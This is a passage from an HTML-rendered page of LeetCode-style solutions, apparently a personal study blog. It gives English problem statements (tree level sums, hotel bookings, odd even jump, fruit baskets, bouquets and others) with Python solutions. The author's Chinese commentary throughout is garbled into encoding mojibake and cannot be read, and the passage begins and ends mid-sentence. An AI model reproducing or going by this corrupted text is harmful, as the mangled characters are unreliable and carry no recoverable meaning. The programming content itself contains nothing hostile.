1, the level of its children is 2, and so on.</p><p>Return the <code>smallest</code> level x such that the sum of all the values of nodes at level x is <code>maximal</code>.</p><p><img src="MaxLevelBinTree.jpeg" alt="blacsheep" /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [1,7,0,7,-8,null,null]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: </span><br><span class="line">Level 1 sum = 1.</span><br><span class="line">Level 2 sum = 7 + 0 = 7.</span><br><span class="line">Level 3 sum = 7 + -8 = -1.</span><br><span class="line">So we return the level with the maximum sum which is level 2.</span><br></pre></td></tr></table></figure></p><p>bfså³å¯ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxLevelSum</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        level = <span class="number">0</span></span><br><span class="line">        parent = []</span><br><span class="line">        child = [root]</span><br><span class="line">        dict_ = &#123;&#125;</span><br><span class="line">        <span class="keyword">while</span> child:</span><br><span class="line">            level += <span class="number">1</span></span><br><span class="line">            parent = child</span><br><span class="line">            child = []</span><br><span class="line">            level_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> node <span class="keyword">in</span> parent:</span><br><span class="line">                <span class="keyword">if</span> node.left:</span><br><span class="line">                    child.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right:</span><br><span class="line">                    child.append(node.right)</span><br><span class="line">                level_sum += node.val</span><br><span class="line">            dict_[level] = level_sum</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sorted</span>(dict_.items(), key=<span class="keyword">lambda</span> x: (-x[<span class="number">1</span>],x[<span class="number">0</span>]))[<span class="number">0</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure></p><h2 id="hotel-bookings-possible">Hotel Bookings Possible</h2><p>A hotel manager has to process <code>N</code> advance bookings of rooms for the next season. His hotel has <code>C</code> rooms. Bookings contain an <code>arrival</code> date and a <code>departure</code> date. He wants to find out whether there are enough rooms in the hotel to satisfy the demand. Write a program that solves this problem in time <code>O(NlogN)</code>.</p><p>Note-If we have <code>arrival</code> and <code>departure</code> on the same date then arrival must be served before the departure.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input 1:</span><br><span class="line">A = [1, 3, 5]</span><br><span class="line">B = [2, 6, 8]</span><br><span class="line">C = 1</span><br><span class="line"># output: 0</span><br><span class="line"></span><br><span class="line">A = [1, 2, 3]</span><br><span class="line">B = [2, 3, 4]</span><br><span class="line">C = 2</span><br><span class="line"># output: 1</span><br></pre></td></tr></table></figure><p>æ’åº, æŒ‡é’ˆæ‰«ä¸€éå³å¯ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="comment"># @param arrive : list of integers</span></span><br><span class="line">    <span class="comment"># @param depart : list of integers</span></span><br><span class="line">    <span class="comment"># @param K : integer</span></span><br><span class="line">    <span class="comment"># @return a boolean</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hotel</span>(<span class="params">self, arrive, depart, K</span>):</span><br><span class="line">        arrive = <span class="built_in">sorted</span>(arrive)</span><br><span class="line">        depart = <span class="built_in">sorted</span>(depart)</span><br><span class="line">        people = <span class="number">0</span></span><br><span class="line">        chair = <span class="number">0</span></span><br><span class="line">        i_index = <span class="number">0</span></span><br><span class="line">        o_index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> o_index &lt; <span class="built_in">len</span>(depart):</span><br><span class="line">            <span class="keyword">while</span> arrive[i_index] &lt;= depart[o_index]:</span><br><span class="line">                people += <span class="number">1</span></span><br><span class="line">                i_index += <span class="number">1</span></span><br><span class="line">                chair = <span class="built_in">max</span>(chair, people)</span><br><span class="line">                <span class="keyword">if</span> i_index == <span class="built_in">len</span>(arrive):</span><br><span class="line">                    <span class="keyword">return</span> chair &lt;= K</span><br><span class="line">            o_index += <span class="number">1</span></span><br><span class="line">            people -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> chair &lt;= K</span><br></pre></td></tr></table></figure></p><h2 id="k-closest-points-to-origin">973. K Closest Points to Origin</h2><p>Given an array of points where <code>points[i] = [x_i, y_i]</code> represents a point on the X-Y plane and an integer <code>k</code>, return the <code>k</code> closest points to the origin <code>(0, 0)</code>.</p><p>The distance between two points on the X-Y plane is the Euclidean distance (i.e., âˆš(x1 - x2)^2 + (y1 - y2)^2).</p><p>You may return the answer in any order. The answer is guaranteed to be unique (except for the order that it is in).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: points = [[3,3],[5,-1],[-2,4]], k = 2</span><br><span class="line">Output: [[3,3],[-2,4]]</span><br><span class="line">Explanation: The answer [[-2,4],[3,3]] would also be accepted.</span><br></pre></td></tr></table></figure><p>ç»å…¸KNN <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kClosest</span>(<span class="params">self, points: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]], k: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">sorted</span>(points, key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>]*x[<span class="number">0</span>] + x[<span class="number">1</span>]*x[<span class="number">1</span>]))[:k]</span><br></pre></td></tr></table></figure></p><h2 id="odd-even-jump">975. Odd Even Jump</h2><p>You are given an integer array <code>arr</code>. From some starting index, you can make a series of jumps. The (1st, 3rd, 5th, ...) jumps in the series are called odd-numbered jumps, and the (2nd, 4th, 6th, ...) jumps in the series are called even-numbered jumps. Note that the jumps are numbered, not the indices.</p><p>You may jump forward from index <code>i</code> to index <code>j</code> (with <code>i &lt; j</code>) in the following way:</p><p>During odd-numbered jumps (i.e., jumps 1, 3, 5, ...), you jump to the index <code>j</code> such that <code>arr[i] &lt;= arr[j]</code> and <code>arr[j]</code> is the smallest possible value. If there are multiple such indices <code>j</code>, you can only jump to the smallest such index <code>j</code>. During even-numbered jumps (i.e., jumps 2, 4, 6, ...), you jump to the index <code>j</code> such that <code>arr[i] &gt;= arr[j]</code> and <code>arr[j]</code> is the largest possible value. If there are multiple such indices <code>j</code>, you can only jump to the smallest such index <code>j</code>. It may be the case that for some index <code>i</code>, there are no legal jumps. A starting index is good if, starting from that index, you can reach the end of the array (index <code>arr.length - 1</code>) by jumping some number of times (possibly 0 or more than once).</p><p>Return the number of good starting indices.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: arr = [10,13,12,14,15]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: </span><br><span class="line">From starting index i = 0, we can make our 1st jump to i = 2 (since arr[2] is the smallest among arr[1], arr[2], arr[3], arr[4] that is greater or equal to arr[0]), then we cannot jump any more.</span><br><span class="line">From starting index i = 1 and i = 2, we can make our 1st jump to i = 3, then we cannot jump any more.</span><br><span class="line">From starting index i = 3, we can make our 1st jump to i = 4, so we have reached the end.</span><br><span class="line">From starting index i = 4, we have reached the end already.</span><br><span class="line">In total, there are 2 different starting indices i = 3 and i = 4, where we can reach the end with some number of jumps.</span><br></pre></td></tr></table></figure><p>æè¿°æŒºå¤æ‚çš„,ä½†è¯´äººè¯å°±æ˜¯æ°¸è¿œä»å·¦å¾€å³è·³,å¥‡æ•°è·³è·³å¤§äºç­‰äºè‡ªå·±çš„,å¶æ•°è·³è·³å°äºç­‰äºè‡ªå·±çš„,æ°¸è¿œè·³ç»å¯¹å€¼å’Œè‡ªå·±å·®æœ€å°çš„,å¹¶ä¸”æœ‰ç›¸åŒå€¼è·³è¿‘çš„.</p><p>ç¬¬ä¸€æ„Ÿè§‰å¯ä»¥ä»åå‘å‰æ¨, åªè¦æœ€åæŠŠå¥‡æ•°è·³èµ·æ­¥çš„èƒ½æ»¡è¶³çš„åŠ èµ·æ¥å°±è¡Œ,åŒæ—¶ç»´æŠ¤ä¸€ä¸ªå¶æ•°è·³dpç»„ç”¨æ¥æ›´å¿«æ·çš„åˆ¤æ–­. ä½†æ˜¯å¯æƒœå¹¶æ²¡æœ‰å†™å‡ºæ¥,é€‰æ‹©äº†æ¯”è¾ƒç¬¨çš„ä»å‰å¾€åæ¨.</p><p>éå†<code>arr</code>,æŠŠ<code>index</code>å’Œ<code>value</code>ä¸¢å­—å…¸,ç„¶åç»´æŠ¤ä¸€ä¸ª<code>key_set</code>. éå¸¸ç¬¨,ä¼˜åŒ–ä¹Ÿä¸å¤ªè¡Œ.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oddEvenJumps</span>(<span class="params">self, arr: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        dict_arr = defaultdict(<span class="built_in">list</span>)</span><br><span class="line">        key = <span class="built_in">sorted</span>(<span class="built_in">list</span>(<span class="built_in">set</span>(arr)))</span><br><span class="line">        res_list = [[<span class="number">1</span>, <span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr))]</span><br><span class="line">        <span class="keyword">for</span> index, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(arr):</span><br><span class="line">            dict_arr[value].append(index)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> index, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(arr):</span><br><span class="line">            <span class="comment"># same item exist</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(dict_arr[v]) &gt; <span class="number">1</span>:</span><br><span class="line">                same_item_index = dict_arr[v][<span class="number">1</span>]</span><br><span class="line">                res_list[same_item_index][<span class="number">0</span>] += res_list[index][<span class="number">1</span>]</span><br><span class="line">                res_list[same_item_index][<span class="number">1</span>] += res_list[index][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                v_index = bisect.bisect_left(key, v)</span><br><span class="line">                lower_v = key[v_index-<span class="number">1</span>] <span class="keyword">if</span> v_index &gt;= <span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">                upper_v = key[v_index+<span class="number">1</span>] <span class="keyword">if</span> v_index &lt;= <span class="built_in">len</span>(key)-<span class="number">2</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">                <span class="keyword">if</span> lower_v:</span><br><span class="line">                    lower_index = dict_arr[lower_v][<span class="number">0</span>]</span><br><span class="line">                    res_list[lower_index][<span class="number">0</span>] += res_list[index][<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> upper_v:</span><br><span class="line">                    upper_index = dict_arr[upper_v][<span class="number">0</span>]</span><br><span class="line">                    res_list[upper_index][<span class="number">1</span>] += res_list[index][<span class="number">0</span>]</span><br><span class="line">            dict_arr[v].pop(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> dict_arr[v]:</span><br><span class="line">                key.pop(v_index)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>(res_list[-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>åç»­çœ‹äº†ä¸‹åˆ«äººçš„ä»£ç ,å‘ç°å¯ä»¥ç”¨æ ˆæ¥å¤„ç† <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oddEvenJumps</span>(<span class="params">self, arr: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> arr:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">next_greater_element</span>(<span class="params">arr</span>):</span><br><span class="line">            n = <span class="built_in">len</span>(arr)</span><br><span class="line">            result = [<span class="literal">None</span>]*n</span><br><span class="line">            stack = []</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                <span class="keyword">while</span> stack <span class="keyword">and</span> arr[stack[-<span class="number">1</span>]] &lt; arr[i]:</span><br><span class="line">                    result[arr[stack.pop()]] = arr[i]</span><br><span class="line">                stack.append(i)</span><br><span class="line">            <span class="keyword">del</span> stack</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        </span><br><span class="line">        n = <span class="built_in">len</span>(arr)</span><br><span class="line">        arr_sorted = <span class="built_in">sorted</span>(<span class="built_in">range</span>(n), key=<span class="keyword">lambda</span> x: arr[x])</span><br><span class="line">        odd = next_greater_element(arr_sorted)</span><br><span class="line">        </span><br><span class="line">        arr_sorted.sort(key=<span class="keyword">lambda</span> x: arr[x], reverse=<span class="literal">True</span>)</span><br><span class="line">        even = next_greater_element(arr_sorted)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Index 0, represents path starting with odd jump</span></span><br><span class="line">        <span class="comment"># Index 1, represents path starting with even jump</span></span><br><span class="line">        dp = [[<span class="number">0</span>, <span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Last Index is always reachable.</span></span><br><span class="line">        dp[-<span class="number">1</span>] = [<span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># If Odd Jump is possible</span></span><br><span class="line">            <span class="keyword">if</span> odd[i] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                dp[i][<span class="number">0</span>] = dp[odd[i]][<span class="number">1</span>]</span><br><span class="line">                </span><br><span class="line">            <span class="comment"># If Even Jump is possible</span></span><br><span class="line">            <span class="keyword">if</span> even[i] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                dp[i][<span class="number">1</span>] = dp[even[i]][<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>([i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> dp])</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œ<code>arr_sorted</code>è¿”å›ä¾æ®<code>value</code>æ’åºçš„<code>index</code>åˆ—è¡¨,ç„¶å<code>next_greater_element</code>ä¾æ®æ­¤åˆ—è¡¨ç®—å‡ºæ‰€æœ‰å…ƒç´ çš„ä¸‹ä¸€è·³<code>index</code>,è¿™æ ·å³å¯å¾—åˆ°odd jumpçš„åˆ—è¡¨, even jumpçš„è¯<code>reverse=True</code>å†sortä¸€éä¸¢è¿›å»å³even jumpåˆ—è¡¨.</p><p>æœ€åä¾æ®ä¸¤ä¸ªåˆ—è¡¨ä»åå¾€å‰æ¨å¯¼å³å¯.</p><h2 id="license-key-formatting">482. License Key Formatting</h2><p>You are given a license key represented as a string <code>s</code> that consists of only alphanumeric characters and dashes. The string is separated into <code>n + 1</code> groups by <code>n</code> dashes. You are also given an integer <code>k</code>.</p><p>We want to reformat the string <code>s</code> such that each group contains exactly <code>k</code> characters, except for the first group, which could be shorter than <code>k</code> but still must contain at least one character. Furthermore, there must be a dash inserted between two groups, and you should convert all lowercase letters to uppercase.</p><p>Return the reformatted license key.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;2-5g-3-J&quot;, k = 2</span><br><span class="line">Output: &quot;2-5G-3J&quot;</span><br><span class="line">Explanation: The string s has been split into three parts, each part has 2 characters except the first part as it could be shorter as mentioned above.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">licenseKeyFormatting</span>(<span class="params">self, s: <span class="built_in">str</span>, k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        s = <span class="string">&#x27;&#x27;</span>.join(s.split(<span class="string">&#x27;-&#x27;</span>)).upper()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(s) &lt;= k:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        seperate = <span class="built_in">len</span>(s)%k</span><br><span class="line">        ret = s[:seperate]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(seperate, <span class="built_in">len</span>(s), k):</span><br><span class="line">            ret += <span class="string">&#x27;-&#x27;</span> + s[i:i+k]</span><br><span class="line">        <span class="keyword">return</span> ret <span class="keyword">if</span> seperate <span class="keyword">else</span> ret[<span class="number">1</span>:]</span><br></pre></td></tr></table></figure><h2 id="unique-email-addresses">929. Unique Email Addresses</h2><p>æè¿°å¾ˆå¤æ‚, ç®€å•è¡¨è¿°å°±æ˜¯ä¿®å¤localname.</p><p>æ–¹æ³•:localnameé‡Œé¢çš„å¥å·æ— è§†æ‰, åŠ å·ç®—æ³¨é‡Šç¬¦, domainä¸å˜</p><p>æ±‚ä¿®å¤localnameåä¸åŒçš„é‚®ä»¶åœ°å€æ•°.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">numUniqueEmails</span>(<span class="params">self, emails: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        ret = []</span><br><span class="line">        <span class="keyword">for</span> email <span class="keyword">in</span> emails:</span><br><span class="line">            local_name, domain = email.split(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">            fixed_local_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> local_name:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]:</span><br><span class="line">                    fixed_local_name += i</span><br><span class="line">                <span class="keyword">elif</span> i == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            ret.append((fixed_local_name, domain))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(<span class="built_in">set</span>(ret))</span><br></pre></td></tr></table></figure><h2 id="fruit-into-baskets">904. Fruit Into Baskets</h2><p>You are visiting a farm that has a single row of fruit trees arranged from left to right. The trees are represented by an integer array <code>fruits</code> where <code>fruits[i]</code> is the type of fruit the <code>ith</code> tree produces.</p><p>You want to collect as much fruit as possible. However, the owner has some strict rules that you must follow:</p><ul><li>You only have two baskets, and each basket can only hold a single type of fruit. There is no limit on the amount of fruit each basket can hold.</li><li>Starting from any tree of your choice, you must pick exactly one fruit from every tree (including the start tree) while moving to the right. The picked fruits must fit in one of your baskets.</li><li>Once you reach a tree with fruit that cannot fit in your baskets, you must stop.</li></ul><p>Given the integer array <code>fruits</code>, return the maximum number of fruits you can pick.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: fruits = [1,2,3,2,2]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: We can pick from trees [2,3,2,2].</span><br><span class="line">If we had started at the first tree, we would only pick from trees [1,2].</span><br></pre></td></tr></table></figure><p>åŒæŒ‡é’ˆ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">totalFruit</span>(<span class="params">self, fruits: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        l, r = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        basket = defaultdict(<span class="built_in">int</span>)</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> r != <span class="built_in">len</span>(fruits):</span><br><span class="line">            basket[fruits[r]] += <span class="number">1</span></span><br><span class="line">            r += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(basket) &gt; <span class="number">2</span>:</span><br><span class="line">                res = <span class="built_in">max</span>(res, r - l - <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">while</span> <span class="built_in">len</span>(basket) &gt; <span class="number">2</span>:</span><br><span class="line">                    l_fruit = fruits[l]</span><br><span class="line">                    basket[l_fruit] -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> basket[l_fruit] == <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">del</span> basket[l_fruit]</span><br><span class="line">                    l += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(res, r - l)</span><br></pre></td></tr></table></figure></p><h2 id="minimum-number-of-days-to-make-m-bouquets">1482. Minimum Number of Days to Make m Bouquets</h2><p>You are given an integer array <code>bloomDay</code>, an integer <code>m</code> and an integer <code>k</code>.</p><p>You want to make <code>m</code> bouquets. To make a bouquet, you need to use <code>k</code> adjacent flowers from the garden.</p><p>The garden consists of <code>n</code> flowers, the <code>ith</code> flower will bloom in the <code>bloomDay[i]</code> and then can be used in exactly one bouquet.</p><p>Return the minimum number of days you need to wait to be able to make <code>m</code> bouquets from the garden. If it is impossible to make m bouquets return <code>-1</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: bloomDay = [1,10,3,10,2], m = 3, k = 1</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: Let us see what happened in the first three days. x means flower bloomed and _ means flower did not bloom in the garden.</span><br><span class="line">We need 3 bouquets each should contain 1 flower.</span><br><span class="line">After day 1: [x, _, _, _, _]   // we can only make one bouquet.</span><br><span class="line">After day 2: [x, _, _, _, x]   // we can only make two bouquets.</span><br><span class="line">After day 3: [x, _, x, _, x]   // we can make 3 bouquets. The answer is 3.</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹è§‰å¾—éå†n,ç„¶åè·‘äº†4000ms,å°±æ„Ÿè§‰ä¸å¤ªå¯¹,åç»­çœ‹äº†ä¸‹solutionå‘ç°è·‘äºŒåˆ†. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minDays</span>(<span class="params">self, bloomDay: <span class="type">List</span>[<span class="built_in">int</span>], m: <span class="built_in">int</span>, k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">time</span>):</span><br><span class="line">            flower = <span class="number">0</span></span><br><span class="line">            bouquet = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> bloomDay:</span><br><span class="line">                <span class="keyword">if</span> i &lt;= time:</span><br><span class="line">                    flower += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flower = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> flower == k:</span><br><span class="line">                    bouquet += <span class="number">1</span></span><br><span class="line">                    flower = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">if</span> bouquet == m:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check(<span class="number">1e9</span>):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        l = <span class="built_in">min</span>(bloomDay)</span><br><span class="line">        r = <span 